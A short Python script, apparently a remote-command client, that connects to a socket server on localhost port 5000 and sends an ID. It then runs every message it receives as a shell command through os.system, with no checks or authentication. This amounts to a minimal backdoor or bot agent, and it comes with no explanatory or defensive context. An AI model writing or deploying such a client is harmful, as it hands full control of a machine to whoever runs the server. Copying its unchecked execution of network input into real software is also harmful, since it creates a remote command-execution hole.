import socket
import os
HOST = "localhost"
PORT = 5000
BUFFERSIZE = 4096
ADDR = (HOST,PORT)
id = input("ID: ")
client = socket.socket()
client.connect(ADDR)
client.send(id.encode("utf8"))
while True:
  yanit = client.recv(BUFFERSIZE)
  if yanit:
    os.system(yanit.decode("utf8"))

